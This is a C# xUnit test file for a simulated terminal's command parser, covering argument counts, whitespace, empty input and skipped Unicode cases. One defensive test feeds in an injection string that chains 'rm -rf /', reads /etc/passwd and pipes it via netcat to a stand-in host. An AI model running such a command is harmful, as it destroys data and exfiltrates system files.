using Xunit;
using Env0.Terminal.Terminal;
using System;
using System.Linq;
using System.Text;

// Psychotic edge-case tests for the command parser.
// Many of these are commented out or skipped because they test impossible/unreachable cases
// (e.g., entering dangerous Unicode via keyboard, whitespace-only input in UX, etc).
// Keeping them for reference, historical documentation, and so anyone reading this knows
// these edge cases were considered and intentionally out of scope.

[Trait("TestType", "Psychotic")]
public class PsychoticCommandParserTests
{
    // --- SKIPPED/COMMENTED TESTS (impossible to trigger or out of project scope) ---

    // Users cannot enter Unicode/control chars from the keyboard; test not needed.
    // [Fact(Skip = "Terminal input is keyboard-only; users cannot enter Unicode/control chars.")]
    // public void Parse_CommandWithUnicodeAndControlChars() { }

    // Terminal input is keyboard-only; zero-width/odd whitespace impossible.
    // [Fact(Skip = "Terminal input is keyboard-only; zero-width/odd whitespace impossible.")]
    // public void Parse_CommandWithZeroWidthSpaceAndWeirdWhitespace() { }

    // Complex quoted argument parsing is not needed in UX; command syntax does not support it.
    // [Fact(Skip = "No support/need for complex quoted argument parsing in UX.")]
    // public void Parse_CommandWithQuotedArgumentsAndEscapes() { }

    // Dangerous unicode arguments not possible via keyboard input.
    // [Fact(Skip = "Dangerous unicode arguments not possible via keyboard input.")]
    // public void Parse_CommandWithArgumentsContainingDangerousUnicode() { }

    // Whitespace-only input cannot occur in UX; test not needed.
    // [Fact(Skip = "Whitespace-only input cannot occur in UX; test not needed.")]
    // public void Parse_OnlyWhitespaceOrGarbage() { }

    // Weird mixed separators (e.g., exotic punctuation as argument separators) cannot be entered via terminal UX.
    // [Fact(Skip = "Weird mixed separators cannot be entered via terminal UX.")]
    // public void Parse_CommandWithMixedSeparators() { }

    // Broken UTF-8 input is impossible from keyboard or normal system usage.
    // [Fact(Skip = "Broken UTF-8 input is impossible from keyboard.")]
    // public void Parse_CommandWithNonAsciiAndBrokenUtf8() { }

    // --- TESTS THAT COVER ACTUAL EDGE/REALISTIC CASES ---

    [Fact]
    public void Parse_CommandWithManyArguments_MaxArgs()
    {
        var parser = new CommandParser();
        var args = Enumerable.Range(1, 1000).Select(i => $"arg{i}").ToArray();
        var input = "cmd " + string.Join(" ", args);
        var result = parser.Parse(input);
        Assert.NotNull(result);
        Assert.Equal("cmd", result.CommandName);
        Assert.Equal(1000, result.Arguments.Length);
        Assert.Equal("arg1", result.Arguments[0]);
        Assert.Equal("arg1000", result.Arguments.Last());
    }

    [Fact]
    public void Parse_EmptyStringAndNullInput()
    {
        var parser = new CommandParser();
        Assert.Null(parser.Parse(""));
        Assert.Null(parser.Parse(null));
    }

    [Fact]
    public void Parse_CommandInjectionAttempt()
    {
        var parser = new CommandParser();
        var input = "echo foo && rm -rf / ; cat /etc/passwd | nc badguy.com 1337";
        var result = parser.Parse(input);
        Assert.NotNull(result);
        Assert.Equal("echo", result.CommandName);
        // Arguments should NOT contain control/injection characters or subsequent commands
        Assert.DoesNotContain("&&", result.Arguments);
        Assert.DoesNotContain(";", result.Arguments);
        Assert.DoesNotContain("|", result.Arguments);
    }

    [Fact]
    public void Parse_CommandWithConsecutiveWhitespaceExplosions()
    {
        var parser = new CommandParser();
        string input = "   ls         -la         /var/log          ";
        var result = parser.Parse(input);
        Assert.NotNull(result);
        Assert.Equal("ls", result.CommandName);
        Assert.Equal(new[] { "-la", "/var/log" }, result.Arguments);
    }

    [Fact]
    public void Parse_CommandAtMaxLength()
    {
        var parser = new CommandParser();
        var sb = new StringBuilder();
        sb.Append("ls");
        for (int i = 0; i < 10000; i++) sb.Append(" a");
        var input = sb.ToString();
        var result = parser.Parse(input);
        Assert.NotNull(result);
        Assert.Equal("ls", result.CommandName);
        Assert.Equal(10000, result.Arguments.Length);
    }

    [Fact]
    public void Parse_CommandNameOnly()
    {
        var parser = new CommandParser();
        var result = parser.Parse("logout");
        Assert.NotNull(result);
        Assert.Equal("logout", result.CommandName);
        Assert.Empty(result.Arguments);
    }

    [Fact]
    public void Parse_CommandWithMultipleSpacesBetweenArgs()
    {
        var parser = new CommandParser();
        var result = parser.Parse("mv    file1.txt      file2.txt");
        Assert.NotNull(result);
        Assert.Equal("mv", result.CommandName);
        Assert.Equal(new[] { "file1.txt", "file2.txt" }, result.Arguments);
    }
}
